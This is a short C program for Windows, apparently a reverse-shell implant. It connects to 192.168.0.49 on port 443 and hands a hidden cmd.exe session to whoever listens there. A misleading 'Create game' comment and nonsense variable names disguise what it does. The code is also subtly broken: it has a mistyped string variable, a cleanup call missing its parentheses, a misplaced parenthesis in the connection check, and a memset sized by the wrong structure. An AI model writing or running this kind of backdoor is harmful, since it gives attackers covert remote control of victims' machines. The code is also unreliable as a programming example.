#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>



#pragma comment(lib, "ws2_32.lib")

int main() {
	wchar_t hello = "192.168.0.49";
	const int p = 443;

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);


	// Create game

	SOCKET first = socket(AF_INET, SOCK_STREAM, 0);
	if (first == INVALID_SOCKET) {
		WSACleanup;
		return 0;
	}

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	InetPton(AF_INET, hello, &server.sin_addr.s_addr);
	server.sin_port = htons(p);

	if (connect(first, (struct sockaddr*)&server, sizeof(server) != 0)) {
		closesocket(first);
		WSACleanup();
		return 1;
	}

	STARTUPINFO  hahahahahah;
	PROCESS_INFORMATION hehehhe;
	memset(&hahahahahah, 0, sizeof(hehehhe));
	hahahahahah.cb = sizeof(hahahahahah);
	hahahahahah.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	hahahahahah.hStdInput = hahahahahah.hStdOutput = hahahahahah.hStdError = (HANDLE)first;
	hahahahahah.wShowWindow = SW_HIDE;

	if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &hahahahahah, &hehehhe)){
		closesocket(first);
		WSACleanup();
	}

	WaitForSingleObject(hehehhe.hProcess, INFINITE);

	closesocket(first);
	WSACleanup();

	return 0;



}